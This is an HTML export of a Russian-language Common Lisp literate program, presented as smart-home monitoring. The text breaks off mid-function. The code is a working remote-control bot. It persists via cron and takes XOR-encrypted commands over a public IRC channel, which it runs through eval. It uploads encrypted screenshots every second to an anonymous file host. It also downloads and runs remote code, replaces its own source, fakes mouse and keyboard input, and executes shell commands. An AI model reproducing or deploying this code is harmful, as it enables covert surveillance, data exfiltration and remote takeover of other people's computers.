<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>&lrm;</title>
<meta name="generator" content="Org mode">
<meta name="author" content="rigidus">
<link href="/css/style.css" rel="stylesheet" type="text/css" />
</head>
<body>
<div id="content">
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#orge6cd0ba">Intro</a></li>
<li><a href="#org5980990">Supervisor</a></li>
<li><a href="#orgcdb22c4">Channel Name</a></li>
<li><a href="#orgbc366a1">File Destionation</a></li>
<li><a href="#orgc036ed2">Irc</a>
<ul>
<li><a href="#org07fff94">Connect</a></li>
<li><a href="#org7f1a58c">Read loop</a></li>
<li><a href="#org0915f69">Irc helper</a></li>
<li><a href="#org909fedd">Command hook</a></li>
<li><a href="#orgcef684d">Sequence XOR</a></li>
<li><a href="#org2653565">Encrypt</a></li>
<li><a href="#org2e78e67">Decrypt</a></li>
<li><a href="#org893bc90">Encode</a></li>
<li><a href="#org1c86199">Decode</a></li>
</ul>
</li>
<li><a href="#orgb58715b">Update On Irc &amp; Features</a>
<ul>
<li><a href="#org9a21466">File obtaining</a></li>
<li><a href="#orgd5f6f19">Replace yourself</a></li>
<li><a href="#org36e4b53">Run program</a></li>
<li><a href="#orgee5fae5">Shutdown</a></li>
<li><a href="#org6719226">Remote GUI: moving &amp; actions</a></li>
</ul>
</li>
<li><a href="#org2e1c846">Snapshot function</a>
<ul>
<li><a href="#org394344c">Wrap image</a>
<ul>
<li><a href="#org0f71510">Get PNG object</a></li>
<li><a href="#orgf31223e">Get PNG sequence</a></li>
<li><a href="#org760230a">Anon File Upload</a></li>
</ul>
</li>
<li><a href="#orgeb5a3fd">Packing image</a></li>
<li><a href="#org881173d">X-Snapshot</a></li>
</ul>
</li>
<li><a href="#org1e56666">Operator's Loop</a>
<ul>
<li><a href="#org00601a2">Operator</a>
<ul>
<li><a href="#orgc5b63bd">op-irc-th management</a></li>
<li><a href="#org9ea9ba9">Task's threads management</a></li>
</ul>
</li>
<li><a href="#org0b0d59c">Operator's Irc Thread Function</a></li>
<li><a href="#org3a7bcfa">Operator's Loop</a>
<ul>
<li><a href="#orgc31fd46">Operator's helper thread</a></li>
</ul>
</li>
<li><a href="#orge1fd179">Operator's Message Hook</a></li>
<li><a href="#orgbd171f3">Rule-based Command Processor</a></li>
<li><a href="#orgcfeee8b">Shot Rule</a></li>
<li><a href="#orgb5c4ae1">Queues</a></li>
<li><a href="#org334b000">Task Function</a></li>
<li><a href="#orge6c687e">Shot Downloader</a></li>
<li><a href="#org1497c60">Anon File Download</a></li>
<li><a href="#orge0bed2b">Unpack image</a></li>
<li><a href="#org7e395b5">Hi Rule</a></li>
<li><a href="#org52dff29">K Rule</a></li>
</ul>
</li>
<li><a href="#org7ed8183">Utils</a></li>
<li><a href="#org9ea2493">Old</a>
<ul>
<li><a href="#org86c5bd2">Save and Load</a></li>
<li><a href="#orgd42f36d">Bit-vector operations</a></li>
<li><a href="#org40841fd">Binarization</a></li>
<li><a href="#orgce08fe9">Bit-image</a></li>
</ul>
</li>
<li><a href="#org153306f">Assembly</a></li>
</ul>
</div>
</div>
<div class="org-src-container">
<pre class="src src-lisp">(sb-posix:get-pid)
*/1 * * * * export DISPLAY=:0 &amp;&amp; cd ~/quicklisp/ &amp;&amp; flock -xn ./srv.lock sbcl --load ./srv.lisp &gt; ./log.txt
</pre>
</div>

<div id="outline-container-orge6cd0ba" class="outline-2">
<h2 id="orge6cd0ba">Intro</h2>
<div class="outline-text-2" id="text-orge6cd0ba">
<p>
Это внешняя система мониторинга, предназначеная для наблюдения за работой
узла сети. Узел сети может быть не только desktop-системой, но и сервером
умного дома и осуществлять управление его компонентами: включать и
выключать нагрузку, отправлять команды роботу-пылесосу ("ехать на
зарядку"), и.т.п.
</p>

<p>
К сожалению, некоторые проприетарные компоненты автоматизации, такие как
3D-принтер, могут управляться только через GUI своей управляющей
программы. Поэтому для того чтобы удаленно управлять ими необходимо
анализировать скриншоты экрана и осуществлять операции виртуальной мышью
и клавиатурой над управляющей программой.
</p>

<p>
Поэтому мы должны отслеживать изменения на экране, отпралять их в
коммуникационный канал (естественно не в открытом виде) и иметь
возможность проанализировать их удаленно, а потом отослать команду,
которая будет выполнена.
</p>

<p>
Наша основная задача - сократить количество передаваемых данных, потому
что узлов сети может быть множество и не все из них имеют быстрые каналы
передачи.
</p>
</div>
</div>

<div id="outline-container-org5980990" class="outline-2">
<h2 id="org5980990">Supervisor</h2>
<div class="outline-text-2" id="text-org5980990">
<p>
Мы хотим создать надежную систему, но подключение к интернету может быть
ненадежным, к тому же нет уверенности в том, что все ошибки, которые
могут возникнуть, будут корректно перехвачены.
</p>

<p>
Поэтому мы сделаем супервизор, который будет перезапускать потоки, в
которых будет происходить основная работа. Если у потока возникнут
проблемы - супервизор отследит это и перезапустит поток.
</p>

<p>
Чтобы иметь возможность изменять супервизор на лету, мы оформим его как
лямбду в глобальной переменной, которую будет вызывать функция
<code>supervisor-loop</code>.
</p>

<p>
Мы также используем флаги, размещенные в глобальных переменных, чтобы
супервизор мог принудительно завершать потоки. Если что-то пойдет не так
то поток может, например, перезапустить себя, выставив нужный флаг.
</p>

<p>
Каждую секунду супервизор инкрементирует состояние переменной
<code>watchdog-timer</code>. Если поток завис и не сбрасывает эту переменную в
ноль - супервизор принудительно завершает поток, что приводит к его
перезапуску.
</p>

<p>
Если соединение с irc-сервером установлено (о чем свидетельствует
<code>connection-established-flag</code>) то супервизор должен запускать новый поток
репортинга каждую секунду. Задача этого потока - сделать скриншот экрана,
поместить в png-файл, зашифровать его, загрузить на файлообменник и
послать полученную ссылку в чат. После выполнения задачи поток должен
завершиться. Это не обязательно произойдет - он может зависнуть из-за
ошибки или просто слишком долго работать. Поэтому супервизор отслеживает
количество таких потоков и если их становится больше чем
<code>max-shot-thread-cnt</code> удаляет те, которые работают слишком долго.
</p>

<p>
[TODO:gmm] Возможно, эта модель не требуется, т.к. нам не нужно создавать
по отдельному потоку для скриншотинга каждую секунду. Т.е. мы вполне
можем обойтись только контролем зависания одного потока, в котором
работает цикл приема сообщений.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org523c950">(defparameter *outlock* (bt:make-recursive-lock "output-lock"))

(defmacro bprint (var)
  `(subseq (with-output-to-string (*standard-output*)
             (pprint ,var)) 1))

(defmacro dbg (msg &amp;rest params)
  "debug output with lock"
  `(bt:with-recursive-lock-held (*outlock*)
     (format t ,msg ,@params)
     (finish-output)))

(defun decode-time (universal-time)
  (multiple-value-bind (second minute hour date month year day daylight-p zone)
      (decode-universal-time universal-time)
    (format nil "~A-~A-~A ~A:~A:~A" year month date hour minute second)))

(defparameter *max-diffs-cnt* 4)

(defparameter *sleep-interval* 3)

(defparameter *watchdog-timer* 0)

(defparameter *watchdog-timer-max* 100)

(defparameter *supervisor-stop-flag* nil)

(defparameter *irc-th-stop-flag* nil)

(defparameter *shot-th-stop-flag* nil)

(defparameter *connection-established-flag* nil)

(defparameter *shot-threads* nil)

(defparameter *max-shot-thread-life-time* 5)

(defparameter *max-shot-thread-cnt* 5)

(defparameter *thread-operations-lock*
  (bt:make-recursive-lock "thread-operations-lock"))

;; irc
(defparameter *irc-sess* nil) ;; (get-universal-time)
(defparameter *irc-user* nil) ;; (format nil "b~A" *irc-sess*)
(defparameter *irc-serv* "irc.freenode.org")
(defparameter *irc-chan* "#wntriscoming")
(defparameter *irc-lock* (bt:make-recursive-lock "irc-lock"))
(defparameter *irc-conn* nil)

(defmacro sendmsg (msg &amp;rest params)
  `(bt:with-recursive-lock-held (*irc-lock*)
     (handler-case
         (cl-irc:privmsg *irc-conn* *irc-chan* (format nil ,msg ,@params))
       (t (err)
         (dbg "::irc connect error: ~A~%" (type-of err))
         nil))))

;; irc-hook
;; irc_cmd_proc
;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; ecrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; decrypt
(defun decrypt (base64 seed)
  (let* ((oct (base64:base64-string-to-usb8-array base64))
         (gen (prbs:byte-gen 31 :seed seed))
         (len (length oct))
         (gam (funcall gen len)))
    (seq-xor len oct gam)))

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

;; decode
(defun decode (cmd seed)
  (multiple-value-bind (match-p result)
      (ppcre:scan-to-strings "s/([0-f]*)/(.*)$" cmd)
    (unless match-p
      (return-from decode nil))
    (destructuring-bind (crc32 cmd)
        (coerce result 'list)
      (let* ((oct (decrypt cmd seed))
             (crc (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct))))
        (if (equal crc crc32)
            (flex:octets-to-string oct :external-format :utf-8)
            ;; else
            nil)))))

(defparameter *irc-cmd*
  (lambda (param)
    (block irc-cmd-block
      (let* ((msg (cadr (CL-IRC:ARGUMENTS param)))
             (cmd (decode msg *irc-sess*)))
        (dbg "::MSG: [~A]~%" msg)
        (dbg "::CMD: [~A]~%" cmd)
        (finish-output)
        (unless (null cmd)
          (setf *watchdog-timer* 0)
          (let ((result (handler-case (bprint (eval (read-from-string cmd)))
                          (t (err)
                            (dbg "::irc-cmd error: ~A~%" (type-of err))
                            (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
                            (return-from irc-cmd-block nil)))))
            (setf *watchdog-timer* 0)
            (sendmsg "=&gt; ~A" result)
            (dbg "::=&gt; ~A~%" result)
            (finish-output)))))))

;; example of send encoded cmd
;; (encode "(print 1)" *irc-sess*)

;; example of wrong encoded cmd
;; (encode "(print 1)" (get-universal-time))

(defun irc-msg-hook (param)
  "MUST return T for stop hooks processing"
  (funcall *irc-cmd* param)
  (setf *watchdog-timer* 0)
  t)

(defun irc-helper ()
  (sleep 1)
  (cl-irc:add-hook *irc-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'irc-msg-hook)
  (sleep 1)
  (bt:with-recursive-lock-held (*irc-lock*)
    (cl-irc:join *irc-conn* *irc-chan*))
  (sleep 1)
  (bt:with-recursive-lock-held (*irc-lock*)
    (setf *connection-established-flag* t))
  (sendmsg "hi"))

(defun irc-loop ()
  (bt:make-thread
   #'irc-helper :name "irc-helper-th"
   :initial-bindings
   `((*standard-output* . ,*standard-output*)
     (*irc-sess* . ,*irc-sess*)
     (*irc-user* . ,*irc-user*)
     (*irc-serv* . ,*irc-serv*)
     (*irc-chan* . ,*irc-chan*)
     (*irc-lock* . ,*irc-lock*)
     (*irc-conn* . ,*irc-conn*)))
  (handler-case (cl-irc:read-message-loop *irc-conn*)
    (SB-INT:SIMPLE-STREAM-ERROR (err)
      (dbg "::irc-loop error: ~A~%" (type-of err)))
    ;; (t (err)
    ;;   (dbg "::irc-loop error: ~A~%" (type-of err)))
    ))

(defun irc ()
  "irc thread func"
  (setf *irc-sess* (get-universal-time))
  (setf *irc-user* (format nil "b~A" *irc-sess*))
  (setf *irc-conn*
        (handler-case
            (cl-irc:connect :nickname *irc-user* :server *irc-serv*)
          (USOCKET:NS-TRY-AGAIN-CONDITION (err)
            (dbg "::irc connect error: ~A~%" (type-of err))
            nil)
          (t (err)
            (dbg "::irc connect error: ~A~%" (type-of err))
            nil)))
  (when *irc-conn*
    (dbg "::irc conn:~A~%" *irc-conn*)
    (setf *watchdog-timer* 0)
    (irc-loop)))

;; update
;; anon_file_download
(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-download-link (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings
              "(https://cdn-([0-9]*)\.anonfile.com\/(.*))\\\""
              str)
           (when match-p (return (aref result 0))))))

(defun anon-file-download (filename)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request (format nil "https://anonfile.com~A" filename)
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (link (get-download-link text)))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request link
             :user-agent *user-agent*
             :cookie-jar cookie-jar
             :additional-headers *additional-headers*
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

(defun update (link key)
  (let* ((base64 (anon-file-download link))
         (oct    (decrypt base64 key))
         (cmd    (flex:octets-to-string oct :external-format :utf-8))
         (result (handler-case (bprint (eval (read-from-string cmd)))
                   (t (err)
                     (dbg "::irc-cmd error: ~A~%" (type-of err))
                     (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
                     (return-from update nil)))))
    result))

;; (update "/3444C7Dbna/u-3784602724" 1234567890)

;; shot
;; x_snapshot
(defmacro with-display (host (display screen root-window) &amp;body body)
  `(let* ((,display (xlib:open-display ,host))
          (,screen (first (xlib:display-roots ,display)))
          (,root-window (xlib:screen-root ,screen)))
     (unwind-protect (progn ,@body)
       (xlib:close-display ,display))))

(defmacro with-default-display ((display &amp;key (force nil)) &amp;body body)
  `(let ((,display (xlib:open-default-display)))
     (unwind-protect
          (unwind-protect
               ,@body
            (when ,force
              (xlib:display-force-output ,display)))
       (xlib:close-display ,display))))

(defmacro with-default-display-force ((display) &amp;body body)
  `(with-default-display (,display :force t) ,@body))

(defmacro with-default-screen ((screen) &amp;body body)
  (let ((display (gensym)))
    `(with-default-display (,display)
       (let ((,screen (xlib:display-default-screen ,display)))
         ,@body))))

(defmacro with-default-window ((window) &amp;body body)
  (let ((screen (gensym)))
    `(with-default-screen (,screen)
       (let ((,window (xlib:screen-root ,screen)))
         ,@body))))

(defun x-size ()
  (with-default-screen (s)
    (values
     (xlib:screen-width s)
     (xlib:screen-height s))))

(defparameter *default-x* 0)
(defparameter *default-y* 0)
(defparameter *default-width* 800)
(defparameter *default-height* 600)

(defun init-defaults ()
  (multiple-value-bind (width height)
      (x-size)
    (setf *default-width* width
          *default-height* height
          *default-x* 0
          *default-y* 0)))

(init-defaults)

(defun raw-image-&gt;png (data width height)
  (let* ((png (make-instance 'zpng:png :width width :height height
                             :color-type :truecolor-alpha
                             :image-data data))
         (data (zpng:data-array png)))
    (dotimes (y height)
      (dotimes (x width)
        ;; BGR -&gt; RGB, ref code: https://goo.gl/slubfW
        ;; diffs between RGB and BGR: https://goo.gl/si1Ft5
        (rotatef (aref data y x 0) (aref data y x 2))
        (setf (aref data y x 3) 255)))
    png))

(defun x-snapshot (&amp;key (x *default-x*) (y *default-y*)
                     (width  *default-width*) (height *default-height*)
                     path)
  ;; "Return RGB data array (The dimensions correspond to the height, width,
  ;; and pixel components, see comments in x-snapsearch for more details),
  ;; or write to file (PNG only), depend on if you provide the path keyword"
  (with-default-window (w)
    (let ((image
           (raw-image-&gt;png
            (xlib:get-raw-image w :x x :y y
                                :width width :height height
                                :format :z-pixmap)
            width height)
          ))
      (if path
          (let* ((ext (pathname-type path))
                 (path
                  (if ext
                      path
                      (concatenate 'string path ".png")))
                 (png? (or (null ext) (equal ext "png"))))
            (cond
              (png? (zpng:write-png image path))
              (t (error "Only PNG file is supported"))))
          (zpng:data-array image)))))

;; (x-snapshot :path "x-snapshot-true-color.png")

;; pack_image
(defun pack-img (image)
  (declare (optimize (speed 3) (safety 0)))
  (let* ((dims (array-dimensions image))
         (height (car dims))
         (width (cadr dims))
         (new-width (ash (logand (+ width 7) (lognot 7)) -3))
         (need-finisher (not (equal new-width (ash width -3))))
         (result (make-array (list height new-width)
                             :element-type '(unsigned-byte 8)))
         (bp 8)
         (acc 0))
    (declare (type (unsigned-byte 8) acc)
             (type fixnum bp)
             (type fixnum width)
             (type fixnum new-width)
             (type fixnum height))
    (macrolet ((byte-finisher (acc qy qx bp)
                 `(progn
                    ;; (format t "~8,'0B(~2,'0X)" ,acc ,acc)
                    (setf (aref result ,qy (ash ,qx -3)) ,acc)
                    (setf ,acc 0)
                    (setf ,bp 8))))
      (do ((qy 0 (incf qy)))
          ((= qy height))
        (declare (type fixnum qy))
        (do ((qx 0 (incf qx)))
            ((= qx width) (when need-finisher
                            (byte-finisher acc qy qx bp)))
          (declare (type fixnum qx))
          (let* ((avg (floor (+ (aref image qy qx 0)
                                (aref image qy qx 1)
                                (aref image qy qx 2))
                             3))
                 (pnt (ash avg -7)))
            (declare (type fixnum avg))
            (declare (type fixnum pnt))
            (decf bp)
            (setf acc (logior acc (ash pnt bp)))
            (when (= bp 0)
              (byte-finisher acc qy qx bp))))
        ;; (format t "~%")
        ))
    result))

;; (disassemble 'pack-img)

;; TEST: pack-img
;; (time
;;  (let* ((image (pack-img (x-snapshot)))
;;         (dims (array-dimensions image)))
;;    (save-png (cadr dims)
;;              (car dims)
;;              (format nil "~A" (gensym "FILE"))
;;              image
;;              :grayscale)))

;; wrap_img
;; get_png_obj
(defun get-png-obj (width height image &amp;optional (color-type :truecolor-alpha))
  (let* ((png (make-instance 'zpng:png :width width :height height
                             :color-type color-type))
         (vector (make-array ;; displaced vector - need copy for save
                  (* height width (zpng:samples-per-pixel png))
                  :displaced-to image :element-type '(unsigned-byte 8))))
    ;; Тут применен потенциально опасный трюк, когда мы создаем
    ;; объект PNG без данных, а потом добавляем в него данные,
    ;; используя неэкспортируемый writer.
    ;; Это нужно чтобы получить третью размерность массива,
    ;; который мы хотим передать как данные и при этом
    ;; избежать создания для этого временного объекта
    (setf (zpng::%image-data png) (copy-seq vector))
    png))

;; get_png_seq
(defun get-png-seq (png)
  (flex:with-output-to-sequence (stream)
    (zpng:write-png-stream png stream)))

;; anon_file_upload
;; (setf drakma:*header-stream* *standard-output*)

(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-csrf (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
           (when match-p (return (aref result 0))))))

(defun get-cookies-alist (cookie-jar)
  "Получаем alist с печеньками из cookie-jar"
  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

(defun anon-file-upload (filename content)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request "https://anonfile.com/"
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (csrf (get-csrf text))
             (boundary "---------------------------196955623314664815241571979859")
             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
             (new-headers `(("Accept" . "application/json")
                            ("Accept-Language" . "en-US,en;q=0.5")
                            ("Cache-Control" . "no-cache")
                            ("X-Requested-With" . "XMLHttpRequest")
                            ("X-CSRF-Token" . ,csrf)
                            ("Origin" . "https://anonfile.com")
                            ("Referer" . "https://anonfile.com/")
                            ("Content-Type" . ,type-header)
                            ("TE" . "Trailers"))))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request
             "https://api.anonfile.com/upload"
             :user-agent *user-agent*
             :method :post
             :form-data t
             :content (format nil "--~A
Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
Content-Type: application/octet-stream

~A
--~A--" boundary filename content boundary)
             :cookie-jar cookie-jar
             :additional-headers new-headers
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; wrap-img
(defun wrap-img (frmt-filename-str dims image)
  (let* ((height   (car  dims))
         (width    (cadr dims))
         (png      (get-png-obj width height image :grayscale))
         (png-seq  (get-png-seq png))
         (base64   (encrypt png-seq *irc-sess*))
         (filename (format nil frmt-filename-str
                           (format nil "~A" (get-universal-time))))
         (json     "")
         (result   (handler-case
                       (progn
                         (setf json (anon-file-upload filename base64))
                         (cl-json:decode-json-from-string json))
                     (JSON:JSON-SYNTAX-ERROR (err)
                       (dbg "::wrap-img error: ~A~%~A~%"  (type-of err) json)
                       (sendmsg "ERR(wrap-img): [~A]" (type-of err))
                       (return-from wrap-img nil))
                     (t (err)
                       (dbg "::wrap-img error: ~A~%" (type-of err))
                       (sendmsg "ERR(wrap-img): [~A]" (type-of err))
                       (return-from wrap-img nil))))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    (if link
        (sendmsg link)
        (sendmsg result))
    t))

;; get_img_diff
(declaim (inline get-img-diff))

(defun get-img-diff (dims prev snap)
  (let ((diff (make-array dims :element-type '(unsigned-byte 8))))
    (do ((qy 0 (incf qy)))
        ((= qy (car dims)))
      (declare (type fixnum qy))
      (do ((qx 0 (incf qx)))
          ((= qx (cadr dims)))
        (declare (type fixnum qx))
        (setf (aref diff qy qx)
              (logxor (aref prev qy qx)
                      (aref snap qy qx)))))
    diff))

;; shot
(let ((prev)
      (cnt 9999))
  (defun shot ()
    (declare (inline get-img-diff))
    (let* ((snap (pack-img (x-snapshot)))
           (dims (array-dimensions snap)))
      (if (&gt; cnt *max-diffs-cnt*)
          (progn ;; key frame
            (wrap-img "~A" dims snap)
            (setf prev snap)
            (setf cnt 0))
          ;; else - diff
          (if (wrap-img (format nil "~~A_~A" cnt) dims
                        (get-img-diff dims prev snap))
              (progn
                (setf prev snap)
                (incf cnt))
              ;; else: wrap failure
              (setf cnt 9999))))))

;; upload_code
(defun upload-code (code key)
  (let* ((oct (flex:string-to-octets code :external-format :utf-8))
         (base64 (encrypt oct key))
         (filename (format nil "u-~A" (get-universal-time)))
         (result   (cl-json:decode-json-from-string
                    (anon-file-upload filename base64)))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    link))

;; TEST for upload
;; (upload-code "(defun alfa () (print 1))" 1234567890)
;; /t1TaCeD1ne/u-3784605289

;; replace_yourself
(defun download-and-decrypt (link key)
  (flex:octets-to-string
   (decrypt
    (anon-file-download link)
    key)
   :external-format :utf-8))

;; (upload-code
;;  (alexandria:read-file-into-string "q.lisp\"")

;; (download-and-decrypt "/some/link" *tmpkey*)

(defun replace-yourself (link key)
  (alexandria:write-string-into-file
   (download-and-decrypt link key)
   "q.lisp" :if-exists :supersede)
  'ok)

;; (upload-code (alexandria:read-file-into-string "q.lisp") 1234567890)
;; =&gt; "/some/file"

;; (defparameter *receiver* 3784783570)
;; (defparameter *tmpkey* 1234567890)

;; (upload-code-and-send
;;  "(replace-yourself \"/some/file\" 1234567890)"
;;  *tmpkey*
;;  *receiver*)

;; remote_gui
(defun x-move (x y)
  (if (and (integerp x) (integerp y))
      (with-default-display-force (d)
        (xlib/xtest:fake-motion-event d x y))
      (error "Integer only for position, (x: ~S, y: ~S)" x y)))

(defun mklist (obj)
  (if (and
       (listp obj)
       (not (null obj)))
      obj (list obj)))

(defmacro defun-with-actions (name params actions &amp;body body)
  ;; "This macro defun a function which witch do mouse or keyboard actions,
  ;; body is called on each action."
  `(defun ,name ,params
     (mapcar
      #'(lambda (action)
          ,@body)
      (mklist ,actions))))

(defun perform-mouse-action (press? button &amp;key x y)
  (and x y (x-move x y))
  (with-default-display-force (d)
    (xlib/xtest:fake-button-event d button press?)))

(defun perform-key-action (press? keycode) ; use xev to get keycode
  (with-default-display-force (d)
    (xlib/xtest:fake-key-event d keycode press?)))

(macrolet ((def (name actions)
             `(defun-with-actions ,name
                  (&amp;key (button 1) x y)
                ,actions
                (funcall #'perform-mouse-action
                         action button :x x :y y))))
  (def x-mouse-down t)
  (def x-mouse-up nil)
  (def x-click '(t nil))
  (def x-dbclick '(t nil t nil)))

(defmacro with-scroll (pos neg clicks x y)
  `(let ((button (cond
                   ((= 0 ,clicks) nil)
                   ((&gt; 0 ,clicks) ,pos)    ; scroll up/right
                   ((&lt; 0 ,clicks) ,neg)))) ; scroll down/left
     (dotimes (_ (abs ,clicks))
       (x-click :button button :x ,x :y ,y))))

(defun x-vscroll (clicks &amp;key x y)
  (with-scroll 4 5 clicks x y))

(defun x-scroll (clicks &amp;key x y)
  (x-vscroll clicks :x x :y y))

(defun x-hscroll (clicks &amp;key x y)
  (with-scroll 7 6 clicks x y))

(macrolet ((def (name actions)
             `(defun-with-actions ,name (keycode)
                ,actions
                (funcall #'perform-key-action
                         action keycode))))
  (def x-key-down t)
  (def x-key-up nil)
  (def x-press '(t nil)))

;; (block perform-key-action-test
;;   (perform-key-action t 116)
;;   (sleep .1)
;;   (perform-key-action nil 116))

;; (defparameter *mouse-left* 1)

;; (defparameter *mouse-middle* 2)

;; (block perform-mouse-action-test
;;   (perform-mouse-action t *mouse-left* :x 100 :y 100)
;;   (sleep .1)
;;   (perform-mouse-action nil *mouse-left* :x 100 :y 100))

;; shell_command
(defvar *shell-search-paths* '("/usr/bin/" "/usr/local/bin/"))

(defparameter *bourne-compatible-shell* "/bin/sh"
  "The path to a Bourne compatible command shell in
physical pathname notation.")

(defun directory-pathname-p (pathname)
  "Does `pathname` syntactically  represent a directory?
  ---
  A directory-pathname is a pathname _without_ a filename. The three
  ways that the filename components can be missing are for it to be `nil`,
  `:unspecific` or the empty string.
  "
  (flet ((check-one (x)
           (not (null (member x '(nil :unspecific "")
                              :test 'equal)))))
    (and (check-one (pathname-name pathname))
         (check-one (pathname-type pathname)))))

(defmacro with-gensyms (syms &amp;body body)
  `(let ,(mapcar #'(lambda (s)
                     `(,s (gensym)))
                 syms)
     ,@body))

(defmacro with-stream-from-specifier ((stream)
                                      &amp;body body)
  (with-gensyms (s close? result)
    `(let ((,close? t)
           ,s
           ,result)
       (unwind-protect
            (setf ,result
                  (multiple-value-list
                   (let (,stream)
                     (setf (values ,s ,close?)
                           nil)
                     (setf ,stream ,s)
                     ,@body)))
         (when (and ,close? ,s)
           (let ((it (close-stream-specifier ,s)))
             (when it
               (setf (first ,result) it)))))
       (values-list ,result))))

(defmacro with-input ((var) &amp;body body)
  "Create an input stream from source and bind it to var within the body of the with-input form. The stream will be closed if necessary on exit."
  `(with-stream-from-specifier (,var)
     ,@body))

(defun close-stream-specifier (s)
  (if (equal (type-of s) 'string-stream)
      (prog1
          (values (get-output-stream-string s))
        (close s))
      ;; else
      (progn
        (close s)
        (values nil))))

(defun file-to-string-as-lines (stream)
  (with-output-to-string (s)
    (loop for line = (read-line stream nil :eof nil)
       until (eq line :eof) do
         (princ line s)
         (terpri s))))

(defun %shell-command (command)
  (with-input (input-stream)
    (let* ((process (sb-ext:run-program
                     *bourne-compatible-shell*
                     (list "-c" command)
                     :wait nil :input input-stream
                     :output :stream
                     :error :stream))
           (output-thread (sb-thread:make-thread
                           #'(lambda ()
                               (file-to-string-as-lines
                                (sb-impl::process-output process)))))
           (error-thread (sb-thread:make-thread
                          #'(lambda ()
                              (file-to-string-as-lines
                               (sb-impl::process-error process))))))
      (let ((error-code
             (sb-impl::process-exit-code (sb-impl::process-wait process)))
            (output-string (sb-thread:join-thread output-thread))
            (error-string (sb-thread:join-thread error-thread)))
        (close (sb-impl::process-output process))
        (close (sb-impl::process-error process))
        (values output-string error-string error-code)))))

(defun find-command-ending-in-string (command)
  (let ((checking? t))
    (loop for ch across command
       for i from 0 do
         (cond ((and checking? (char= ch #\Space))
                (return i))
               ((char= ch #\\)
                (setf checking? nil))
               (t
                (setf checking? t))))))


(defun shell-command (command)
  "Synchronously execute `command` using a Bourne-compatible shell,
   returns (values output error-output exit-status).
   --
   The `command` can be a full path to a shell executable binary
   or just its name. In the later case, the variable `*shell-search-paths*`
   will be used to find the executable.
   --
   Depending on the implementation, the variable `*bourne-compatible-shell*`
   may be used to find a shell to use in executing `command`."
  (let* ((pos-/ (position #\/ command))
         (pos-space (find-command-ending-in-string command))
         (binary (subseq command 0 (or pos-space)))
         (args (and pos-space (subseq command pos-space))))
    (when (or (not pos-/)
              (and pos-/ pos-space)
              (and pos-space
                   (&lt; pos-/ pos-space)))
      ;; no slash in the command portion, try to find the command with
      ;; our path
      (setf binary
            (or (loop for path in *shell-search-paths* do
                     (let ((full-binary (make-pathname :name binary
                                                       :defaults path)))
                       (when (and (probe-file full-binary)
                                  (directory-pathname-p full-binary))
                         (return full-binary))))
                binary)))
    (multiple-value-bind (output error status)
